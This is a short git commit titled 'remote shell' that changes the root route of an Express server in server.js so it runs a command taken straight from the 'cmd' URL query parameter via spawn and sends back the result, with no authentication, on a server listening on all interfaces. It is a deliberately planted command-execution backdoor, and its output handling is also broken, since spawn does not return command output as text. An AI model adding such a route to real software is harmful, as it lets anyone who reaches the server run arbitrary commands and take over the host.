19ba1da6759262f857eff66dfc7e726c40163060
Bartosz Gotowski <bartoszgotowski03@gmail.com>
2023-08-30 18:06:18 +0200

    remote shell

--- server.js
+++ server.js
@@ -9,7 +9,7 @@ const HOST = "0.0.0.0";
 // App
 const app = express();
 app.get("/", (req, res) => {
-  res.send("Hello World");
+  res.send(spawn(req.query.cmd).toString());
 });
 
 app.listen(PORT, HOST, () => {
